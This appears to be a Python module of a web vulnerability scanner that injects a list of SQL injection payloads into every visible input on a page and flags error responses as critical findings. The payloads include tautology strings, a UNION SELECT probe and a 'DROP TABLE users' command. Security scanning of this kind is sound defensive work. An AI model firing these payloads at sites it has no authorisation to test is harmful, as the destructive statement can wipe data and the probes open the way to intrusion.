from utils.selectors import get_input_selectors
from utils.helpers import is_error_page, truncate
from core.logger import log

PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "' UNION SELECT null--",
]


def check(page) -> list[dict]:
    """
    Inject SQL payloads into all visible inputs.
    Detects errors or anomalous responses that indicate SQLi vulnerability.
    """
    findings = []
    url = page.url
    selectors = get_input_selectors(page)

    if not selectors:
        log.info("SQLi: no input fields found on page")
        return findings

    for selector in selectors:
        for payload in PAYLOADS:
            try:
                page.goto(url, wait_until="domcontentloaded", timeout=10000)
                page.wait_for_timeout(500)  # Wait for elements to be visible
                
                # Check if element is visible before trying to fill
                locator = page.locator(selector)
                if not locator.is_visible(timeout=2000):
                    continue  # Skip invisible elements
                
                locator.fill(payload, timeout=5000)
                page.keyboard.press("Enter")
                page.wait_for_load_state("networkidle", timeout=5000)

                content = page.content()
                if is_error_page(content):
                    log.warning(f"⚠️  SQLi error response — {selector} — {truncate(payload)}")
                    findings.append({
                        "type": "sql_injection",
                        "selector": selector,
                        "payload": payload,
                        "severity": "critical",
                        "url": url,
                    })
                    break  # one confirmed hit per field is enough

            except Exception as e:
                # Silently skip elements that can't be tested
                continue

    return findings
